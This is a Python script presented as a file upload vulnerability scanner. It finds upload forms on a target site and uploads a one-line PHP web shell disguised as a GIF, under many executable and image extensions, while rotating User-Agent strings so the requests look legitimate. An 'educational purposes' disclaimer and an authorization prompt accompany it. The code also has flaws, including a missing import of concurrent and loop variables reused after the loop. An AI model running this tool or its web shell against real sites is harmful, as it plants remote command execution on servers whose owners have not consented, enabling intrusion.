import requests
import sys
import argparse
import time
import random
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup # For parsing HTML to find forms - install with: pip install beautifulsoup4
from colorama import Fore, Style, init
import os

# Initialize Colorama for colored output
init(autoreset=True)


# List of common User-Agents for rotation to make requests appear more legitimate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

# Payloads for testing file upload vulnerabilities
# Unauthorized extensions
MALICIOUS_EXTENSIONS = [
    ".php", ".php3", ".php4", ".php5", ".phtml", ".phps",
    ".asp", ".aspx", ".ascx", ".ashx",
    ".jsp", ".jspx", ".jhtml",
    ".pl", ".cgi",
    ".sh", ".bash",
    ".html", ".htm", # Can be dangerous if script execution is allowed
    ".swf", # Flash files, potential XSS
    ".exe", ".bat", ".com" # Executables
]

# Polyglot files (image with embedded PHP shell)
# This is a very basic PHP web shell content. In a real scenario, it would be more complex.
PHP_SHELL_CONTENT = b"""GIF89a;
<?php system($_GET['cmd']); ?>
"""

# Common image extensions to try hiding PHP shell in
IMAGE_EXTENSIONS = [".gif", ".jpg", ".jpeg", ".png"]

# A simpler, unique string to look for in response if the uploaded file path is returned
UPLOAD_SUCCESS_INDICATORS = [
    "successfully uploaded", "file uploaded", "upload complete", "uploaded to",
    "file saved", "upload success"
]
UPLOAD_FAILURE_INDICATORS = [
    "invalid file type", "file not allowed", "extension not allowed", "upload failed",
    "access denied", "error uploading"
]


def get_random_user_agent():
    """Returns a random User-Agent string."""
    return random.choice(USER_AGENTS)

def print_banner():
    """Prints a professional ASCII art banner for the File Upload scanner."""
    banner = f"""
{Fore.YELLOW}{Style.BRIGHT}
█▀▀ █ █░░ █▀▀ █░█ █▀█ █░░ █▀█ ▄▀█ █▀▄   █▀ █▀▀ ▄▀█ █▄░█ █▄░█ █▀▀ █▀█
█▀░ █ █▄▄ ██▄ █▄█ █▀▀ █▄▄ █▄█ █▀█ █▄▀   ▄█ █▄▄ █▀█ █░▀█ █░▀█ ██▄ █▀▄
                            FileUpload Scanner V1.0
---------------------------------------------------
{Style.RESET_ALL}
"""
    print(banner)

def make_request(url, method='GET', data=None, files=None, timeout=15):
    """
    Helper function to make HTTP requests with random User-Agent.
    Returns the response object or None on error.
    """
    headers = {'User-Agent': get_random_user_agent()}
    try:
        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, data=data, files=files, timeout=timeout)
        else: # Default to GET
            response = requests.get(url, headers=headers, timeout=timeout)
        return response
    except requests.exceptions.RequestException as e:
        # print(f"{Fore.RED}    [ERROR] Request to {url} failed: {e}{Style.RESET_ALL}")
        return None

def extract_upload_forms(html_content, target_url):
    """
    Extracts forms that support file uploads (enctype="multipart/form-data")
    from HTML content.
    """
    soup = BeautifulSoup(html_content, 'html.parser')
    upload_forms = []
    for form_tag in soup.find_all('form', enctype="multipart/form-data"):
        form_action = form_tag.get('action') or target_url
        form_method = form_tag.get('method', 'POST').upper() # File uploads are typically POST
        
        # Resolve relative URLs
        if not urlparse(form_action).netloc:
            form_action = urljoin(target_url, form_action)

        file_inputs = []
        other_inputs = {}
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text')
            input_value = input_tag.get('value', '')
            
            if input_name:
                if input_type == 'file':
                    file_inputs.append(input_name)
                else:
                    other_inputs[input_name] = input_value
        
        if file_inputs:
            upload_forms.append({
                'action': form_action,
                'method': form_method,
                'file_inputs': file_inputs,
                'other_inputs': other_inputs
            })
    return upload_forms

def upload_test_file(form_data, file_input_name, filename, file_content, default_timeout=15):
    """
    Attempts to upload a test file and checks the response.
    Returns True if potentially vulnerable, False otherwise.
    """
    target_url = form_data['action']
    other_inputs = form_data['other_inputs']
    
    files = {
        file_input_name: (filename, file_content, 'application/octet-stream') # generic content type
    }
    
    print(f"{Fore.CYAN}        [+] Attempting upload of '{filename}' to '{target_url}'...{Style.RESET_ALL}")
    
    response = make_request(
        target_url,
        method=form_data['method'],
        data=other_inputs,
        files=files,
        timeout=default_timeout
    )

    if not response:
        print(f"{Fore.RED}            Error: No response for upload attempt.{Style.RESET_ALL}")
        return False, "No response"
    
    # Check for success indicators
    response_text_lower = response.text.lower()
    for indicator in UPLOAD_SUCCESS_INDICATORS:
        if indicator in response_text_lower and response.status_code == 200:
            print(f"{Fore.RED}{Style.BRIGHT}            [!!! POTENTIALLY VULNERABLE - SUCCESS INDICATOR !!!]{Style.RESET_ALL}")
            print(f"{Fore.RED}                Filename: '{filename}', Status: {response.status_code}, Indicator: '{indicator}'{Style.RESET_ALL}")
            # Try to find uploaded file path
            return True, f"Success indicator '{indicator}' found (Status: {response.status_code})"
    
    # Check for failure indicators
    for indicator in UPLOAD_FAILURE_INDICATORS:
        if indicator in response_text_lower:
            print(f"{Fore.GREEN}            [-] Upload of '{filename}' failed (Expected): Status: {response.status_code}, Indicator: '{indicator}'{Style.RESET_ALL}")
            return False, f"Failure indicator '{indicator}' found (Status: {response.status_code})"
            
    # Check for suspicious status codes if no clear indicators
    if response.status_code in [200, 201]:
        print(f"{Fore.YELLOW}            [!] Upload of '{filename}' resulted in ambiguous success (Status: {response.status_code}). Manual verification recommended.{Style.RESET_ALL}")
        return True, f"Ambiguous success (Status: {response.status_code})"
    elif response.status_code in [403, 404, 500]:
        print(f"{Fore.GREEN}            [-] Upload of '{filename}' failed (Status: {response.status_code}).{Style.RESET_ALL}")
        return False, f"Upload failed (Status: {response.status_code})"

    return False, f"No clear indication (Status: {response.status_code})"


def file_upload_scanner(target_url, num_workers=5):
    """
    Main function to orchestrate the File Upload scan.
    """
    vulnerabilities_found = []
    
    print(f"\n{Fore.BLUE}[+] Starting File Upload Vulnerability Scan for {target_url}...{Style.RESET_ALL}")

    print(f"{Fore.BLUE}    [+] Fetching page to identify file upload forms...{Style.RESET_ALL}")
    response = make_request(target_url, method='GET')
    if not response:
        print(f"{Fore.RED}    Error: Could not fetch target URL to find forms.{Style.RESET_ALL}")
        return []
    
    upload_forms = extract_upload_forms(response.text, target_url)
    if not upload_forms:
        print(f"{Fore.YELLOW}    No file upload forms (enctype='multipart/form-data') found on {target_url}. Skipping scan.{Style.RESET_ALL}")
        return []

    print(f"{Fore.BLUE}    [+] Found {len(upload_forms)} file upload forms.{Style.RESET_ALL}")

    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        for form_data in upload_forms:
            for file_input_name in form_data['file_inputs']:
                # Test 1: Unauthorized extensions (e.g., .php shell)
                for ext in MALICIOUS_EXTENSIONS:
                    filename = f"shell{ext}"
                    futures.append(executor.submit(
                        upload_test_file, form_data, file_input_name, filename, PHP_SHELL_CONTENT
                    ))
                
                # Test 2: Polyglot files (e.g., image.gif with PHP shell inside)
                for ext in IMAGE_EXTENSIONS:
                    filename = f"polyglot_shell{ext}"
                    futures.append(executor.submit(
                        upload_test_file, form_data, file_input_name, filename, PHP_SHELL_CONTENT
                    ))
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            is_vuln, details = future.result()
            if is_vuln:
                vulnerabilities_found.append(f"Form '{form_data['action']}', Input '{file_input_name}': {details}")
            # Optional: Print progress
            sys.stdout.write(f"\r    Processed {i+1}/{len(futures)} upload attempts...{Style.RESET_ALL}")
            sys.stdout.flush()

    print(f"\n{Fore.BLUE}--- File Upload Scan Complete ---{Style.RESET_ALL}")
    if vulnerabilities_found:
        print(f"{Fore.RED}{Style.BRIGHT}!!! Found {len(vulnerabilities_found)} Potential File Upload Vulnerabilities !!!{Style.RESET_ALL}")
        for vuln in vulnerabilities_found:
            print(f"{Fore.RED}    - {vuln}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Manual verification is crucial for these findings. Check uploaded directories for suspicious files.{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}No obvious file upload vulnerabilities found with basic tests.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Note: This does not guarantee full immunity. Advanced bypasses may still exist.{Style.RESET_ALL}")
    
    print(f"{Fore.RED}Remember: This tool is for educational purposes only. Unauthorized scanning is illegal and unethical.{Style.RESET_ALL}")
    
    return vulnerabilities_found

if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="Vulnerable File Upload Scanner - For Website Vulnerability Testing.")
    parser.add_argument("target_url", help="The target URL of the page containing the file upload form (e.g., http://example.com/upload.php).")
    parser.add_argument("-w", "--workers", type=int, default=5,
                        help="Number of concurrent workers (threads) for upload attempts (default: 5).")

    args = parser.parse_args()

    # Basic URL validation
    parsed_url = urlparse(args.target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"{Fore.RED}Error: Invalid target URL. Please provide a full URL (e.g., http://example.com/upload.php).{Style.RESET_ALL}")
        sys.exit(1)

    # Final confirmation before launching the scan
    print(f"\n{Fore.YELLOW}!!! WARNING: You are about to launch a File Upload scan on {args.target_url} !!!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This can potentially compromise your server if a vulnerability is found. Proceed with extreme caution.{Style.RESET_ALL}")
    confirmation = input(f"{Fore.YELLOW}Type 'YES' to confirm you understand the risks and have proper authorization: {Style.RESET_ALL}")

    if confirmation.upper() == 'YES':
        file_upload_scanner(args.target_url, num_workers=args.workers)
    else:
        print(f"{Fore.RED}Scan aborted. Please confirm by typing 'YES' if you wish to proceed.{Style.RESET_ALL}")
        sys.exit(0)
